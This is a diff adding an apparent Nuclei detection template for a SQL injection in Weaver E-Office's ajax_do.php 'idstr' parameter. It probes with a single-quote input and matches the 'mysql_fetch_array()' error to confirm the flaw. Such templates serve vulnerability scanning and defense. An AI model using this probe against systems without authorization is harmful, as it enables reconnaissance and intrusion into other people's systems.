@@ -1,0 +1,40 @@
+id: weaver-e-office-ajaxdo-sqli
+info:
+  name: Weaver EOffice ajax_do.php idstr SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sqli
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/E-mobile/create/ajax_do.php?diff=word&idstr=1"
+      - "{{BaseURL}}/E-mobile/create/ajax_do.php?diff=wordsearch&idstr=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<div align=\"center\">暂无相关数据...</div>"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "mysql_fetch_array()"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/E-mobile/create/ajax_do.php?diff=word&idstr=1'"
+      - "{{BaseURL}}/E-mobile/create/ajax_do.php?diff=wordsearch&idstr=1'"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "mysql_fetch_array()"
